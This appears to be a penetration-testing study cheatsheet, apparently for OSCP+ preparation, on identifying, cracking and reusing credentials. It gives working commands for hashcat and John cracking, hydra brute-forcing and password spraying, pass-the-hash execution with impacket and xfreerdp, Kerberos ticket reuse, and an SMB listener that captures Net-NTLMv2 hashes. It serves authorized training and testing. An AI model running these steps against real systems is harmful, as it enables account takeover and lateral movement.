Credential Classification, Cracking and Reuse

← Stage index | Credential cheatsheet | AD procedures | Strategy map | Study methods: Recover and use authentication material; Gain a more useful domain identity

Purpose: distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. Actual credentials belong in private records.

Credential record

SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY
-> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION
-> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION

Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together.

Classify before acting

MaterialRecognitionCompatible use
Cleartext passwordText tied to an identity/sourceNormal protocol/application login
SSH private keyOpenSSH/PEM private-key blockSSH public-key authentication; recover passphrase offline if protected
Linux password recordUSER:$id$salt$digest:...Offline recovery with complete record/format
Application/file verifierTool-specific $...$ or documented digestOffline recovery with matching mode/parser
NT hashUsually 32 hex from SAM/LSASS/NTDS contextOffline recovery; PtH where NTLM and the client support it
Net-NTLMv2 responseUSER::DOMAIN:challenge:proof:blobOffline recovery or live relay under specific conditions; not PtH material
DCC2/MSCache v2Username-dependent cached-domain verifierOffline recovery; not ordinary PtH material
Kerberos ticket.kirbi, ccache or in-memory cacheTicket-specific access subject to realm, SPN, validity, clock and route
Kerberos roast material$krb5asrep$... or $krb5tgs$...Offline recovery with matching enctype/mode
Session/API tokenCookie, bearer/JWT or application tokenIssuing application and authorization context only

Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format:

hashid HASH_OR_FILE
john --list=formats | grep -i KEYWORD
hashcat -hh | grep -i KEYWORD
hashcat --example-hashes | less

Failure cue: No hashes loaded, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.

Validate one known password

Use the normal client for the observed service:

ssh -o PreferredAuthentications=password -p PORT USER@TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore

Local Windows account:

nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares

Decisive output: the destination service accepts the intended identity. Share, session or action access is a separate authorization result.

Variant — known user, targeted password dictionary 
hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET

Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.

Variant — one password across an authorized user list 
hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success

One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.

Variant — HTTP POST form

Capture a correct request and stable failure marker with Burp:

hydra -l USER -P WORDLIST TARGET http-post-form \
  '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT'

Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.

RunasCs — test a known password from an existing Windows shell

Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.

REM Domain account: verify the new process token
RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN

REM Local account: omit the domain switch for the current host's account
RunasCs.exe USER PASSWORD "cmd /c whoami /all"

REM Network-only credentials: local identity stays unchanged
RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9

Read: in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.

RunasCs upstream. Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.

Estimate feasibility

hashcat -b -m MODE
python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"

Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:

exact recovered/default candidates -> organization/user/product words
-> observed policy and mutations -> small dictionary plus rules
-> known mask/hybrid -> broader curated lists/rules
-> exhaustive search only when its measured cost is defensible

Preview mutations before spending the candidate budget:

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50

Hashcat baseline and meaningful modes

hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
hashcat -m MODE hashes.txt --show

-a 0 is dictionary mode. Do not use -a 3 with a wordlist; attack mode 3 expects a mask.

Common source examples identify NTLM as mode 1000, Net-NTLMv2 as 5600 and KeePass as 13400, but confirm against the installed version:

hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'
Mask and session variants 
hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
hashcat --session targeted-mask --restore

Mask order is a hypothesis about structure. Estimate its keyspace before committing time.

Hybrid variant — base word plus three digits 
hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid

Use only when evidence supports both the base words and suffix shape.

John the Ripper workflow

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --session=crack-job --wordlist=wordlist.txt hash.txt
john --restore=crack-job

File-to-hash converters:

zip2john archive.zip > archive.hash
7z2john archive.7z > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
unshadow passwd.copy shadow.copy > linux.hash

Converter availability varies by package/path; locate it rather than assuming:

command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null

Preserve the complete converter output. Some formats include a filename label before : that John accepts but Hashcat may require removed from a separate tool-specific copy.

KeePass database

keepass2john vault.kdbx > keepass.hash
john --wordlist=wordlist.txt keepass.hash
john --show keepass.hash

Hashcat alternative after confirming KDBX/KDF and input format:

hashcat -hh | grep -i keepass
hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13400 keepass.hash --show

Mode 13400 covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault.

SSH private-key passphrase

ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt ssh.hash
john --show ssh.hash
chmod 600 id_rsa
ssh-keygen -y -f id_rsa > derived.pub
ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET

Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. Permission denied (publickey) can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.

Hashcat variant — only for a supported OpenSSH format 
hashcat -hh | grep -i 'OpenSSH\|Private Key'
hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE

Choose MODE from the complete $sshng$... structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not --force with a wrong mode.

Linux password records

unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=Jumbo linux.hash
john --show linux.hash

Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, su policy or a disabled account.

NT hash

Offline recovery:

hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
john --format=NT --wordlist=wordlist.txt nt.hash

Compatible SMB validation:

nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH

NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.

Variant — remote access/execution when the identity has matching rights 
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore

WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.

Net-NTLMv2 response

hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash

A Net-NTLMv2 response is not an NT hash and cannot be supplied to -H or -hashes. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.

The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide.

DCC2 / cached domain logon

hashcat -hh | grep -i 'Domain Cached'
john --format=mscash2 --wordlist=wordlist.txt dcc2.hash

Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material.

Kerberos tickets and caches

Inspect before use:

klist
KRB5CCNAME=TICKET.ccache klist
impacket-ticketConverter TICKET.kirbi TICKET.ccache

Compatible client example:

export KRB5CCNAME=TICKET.ccache
impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN'

Verify client principal, realm, TGT versus service ticket, SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures.

Credential Guard boundary

Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning

Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.

Failure routing

FailureInterpretation / next action
Timeout/no routeFix source position, pivot or service reachability before judging the credential
Wrong TLS/protocol responseReconfirm application and required transport
Local/domain/UPN mismatchRetry only an evidence-backed identity form
Account disabled/locked/expired/restrictedStop guessing; preserve possible credential validity and record state
Password/public-key/NTLM/Kerberos method rejectedChoose material/client compatible with server policy
Authentication succeeds, requested action failsCredential is valid; enumerate authorization and another relevant service
Hash parser rejects inputRecheck complete line, prefix, converter, mode and version
Key unlocks but SSH rejects itRecheck user, server, authorized-key state and algorithm policy
Ticket loads but service rejects itCheck expiry, SPN, realm, clock, DNS and service authorization
PtH login succeeds but execution failsCheck admin rights, UAC remote restrictions and method-specific ports/rights

Re-enumerate after success

accepted identity -> groups/roles -> reachable services -> shares/files
-> authenticated application behavior -> accessible hosts/routes
-> new credentials/tickets/sessions -> privilege and movement handoffs

Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.

Build a small site-specific wordlist with CeWL

Use when observed organization, product or account vocabulary could improve an offline recovery attempt. Keep the crawl on the assigned site.

# Bounded crawl: depth 1, words of at least five characters
cewl -d 1 -m 5 --lowercase -w site-words.txt http://TARGET:PORT/

# Review before using it in the existing format-specific recovery command
head -n 30 site-words.txt
wc -l site-words.txt

Read: useful vocabulary is a candidate list, not a recovered password. An authenticated or JS-only page may expose little to the crawler. Use the already identified Hashcat/John format, then apply a small relevant rule/mask rather than immediately creating an enormous list.

Generate usernames from observed naming conventions

Use when you have names and at least one real account/email that reveals a likely format. Put only relevant names in names.txt.

# Review supported format names in this installed version
./username-anarchy --list-formats

# Restrict output to plausible formats rather than every permutation
./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt
sort -u users.txt -o users.txt

Read: these are candidates. Confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. Keep domain, local-machine and application namespaces distinct. Use Kerbrute's username probe only when the KDC path and domain are known.

Targeted candidates — Crunch, CUPP and rules

Use a mask/profile only when evidence justifies it. This example expands a known six-character stem with three digits; it creates 1,000 candidates.

crunch 9 9 -t 'foobar%%%' -o stem-digits.txt

# Interactive profile-based alternative, when relevant clues exist
python3 cupp.py -i

# Preview a rule expansion before choosing the recovery job
hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40

Read: calculate candidate count and use the matching offline format. CUPP asks questions; invented personal details do not improve the list. A three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login.

Password-protected ZIP — direct test or extracted verifier

Use when the artifact is an encrypted ZIP and its encryption is supported by the selected tool.

# Dictionary attack; -u checks candidates by attempting extraction
fcrackzip -u -D -p WORDLIST archive.zip

# Alternative: extract a verifier for John, preserving the original archive
zip2john archive.zip > archive.hash
john --wordlist=WORDLIST archive.hash
john --show archive.hash

Read: confirm a candidate by opening/extracting the intended file. An unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. Reuse the recovered value only after identifying its account/service context.

HTTP Basic authentication — validate the challenge and failure signal

Use when the endpoint returns a real HTTP Basic challenge. A custom HTML login form is a different mechanism.

curl -i http://TARGET:PORT/PROTECTED_PATH
curl -i --basic -u USER http://TARGET:PORT/PROTECTED_PATH

# Only when bounded online guessing is justified by scope and lockout controls
hydra -l USER -P WORDLIST -s PORT -t 1 -f TARGET http-get /PROTECTED_PATH

Read: distinguish an accepted HTTP identity from permission to the protected function. Confirm a reported success with curl/browser. Redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses.

Change an account’s own expired/known SMB password

Use when you know the old password and the account is allowed or required to change it. This is not an administrative reset of another account.

# Prompts for the old and new password on the specified server/DC
smbpasswd -r DC_HOST -U 'DOMAIN/USER'

Read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. Failure → check account scope, password policy, connectivity and change-password rights. Test the new password with the relevant native service client before moving on.

Sources: upstream 1.

Generate a bounded numeric list for an observed identifier pattern

Use when actual examples indicate a small numeric ID/range. Keep generated input separate from the decision to send online requests.

# Unpadded IDs
seq 0 999 > numbers.txt

# Fixed-width values, only when the observed application uses that format
seq -w 0 999 > numbers-padded.txt

Read: a matching format is a candidate input list, not permission to enumerate every object. Use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. Expand the range only when returned evidence justifies it.

Sources: upstream 1.

An application authenticates to your explicit SMB endpoint

Use only when an observed application/file-request primitive can contact an explicitly supplied SMB path and the network/account policy permits NTLM. This workflow does not poison names or spoof network identities.

# Attacker: serve the intended directory and keep the authentication log
mkdir -p share
sudo impacket-smbserver SHARE ./share -smb2support 2>&1 | tee smb-server.log

# A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash
hashcat -m 5600 netntlmv2.txt WORDLIST
hashcat -m 5600 netntlmv2.txt --show

Supply the actual application with the intended \\LHOST\SHARE\FILE path only through the already verified input mechanism. Read: retain the entire challenge-response line and the reported account/domain. No callback can be routing, SMB egress or NTLM policy; a callback without recoverable credentials is not a password. Validate a recovered plaintext password in the matching identity. Do not substitute this response for the NT hash expected by pass-the-hash tools.
